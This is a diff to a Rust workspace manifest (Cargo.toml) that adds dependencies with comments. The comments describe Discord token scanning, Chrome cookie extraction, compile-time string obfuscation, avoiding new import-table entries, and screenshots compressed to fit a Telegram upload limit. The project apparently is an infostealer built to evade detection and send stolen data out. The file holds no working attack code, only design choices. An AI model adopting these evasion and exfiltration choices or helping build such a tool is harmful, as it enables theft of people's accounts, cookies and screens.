@@ -17,6 +17,9 @@ thiserror = "2.0"
 anyhow = "1.0"
 clap = { version = "4.5", features = ["derive"] }
 hex = "0.4"
+# Discord token scanning: regex + base64 (wave 8).
+regex = "1"
+base64 = "0.22"
 
 # Crypto (RUSTCrypto — the Go stdlib equivalents)
 aes = "0.8"
@@ -40,6 +43,9 @@ windows = { version = "0.62", features = [
     "Win32_System_LibraryLoader",
     "Win32_System_Environment",
     "Win32_System_Diagnostics_Debug",
+    "Win32_System_Diagnostics_ToolHelp",
+    "Win32_System_Console",
+    "Win32_UI_WindowsAndMessaging",
 ] }
 
 # Phase 2 (chromium engine)
@@ -55,6 +61,16 @@ snap = "1.1"
 crc32c = "0.6"
 # sha2: Chrome 130+ cookie value SHA256(host_key) prefix stripping (extract_cookie)
 sha2 = "0.10"
+
+# obfstr: compile-time string obfuscation (per-position entropy seeds — each
+# literal gets its own key stream derived from file/line/column + OBFSTR_SEED,
+# so identical strings at different sites do NOT share ciphertext).
+obfstr = "0.4"
+
+# flate2: screenshot PNG IDAT compression (abi). Pure-Rust backend (miniz_oxide)
+# via `default-features` — no C, no new import-table entries, screens are mostly
+# flat color so deflate collapses them well before the 50MB Telegram cap.
+flate2 = "1"
 
 [workspace.lints.rust]
 # All unsafe lives in crates/abi (or #[cfg(windows)] modules there); enforced repo-wide.
